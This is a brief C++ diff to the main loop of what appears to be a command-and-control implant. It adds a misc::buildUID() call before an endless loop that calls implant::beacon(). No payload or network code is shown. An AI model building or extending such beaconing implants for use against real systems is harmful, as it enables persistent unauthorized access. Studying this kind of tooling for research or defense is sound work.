@@ -3,11 +3,12 @@
 #endif
 
 #include "implant.h"
+#include "misc.h"
 #include <iostream>
 
 int main() {
     //implant::initConnection();
-
+    misc::buildUID();
     while (true) { // Run indefinitely
         // Call the beacon function
         implant::beacon();
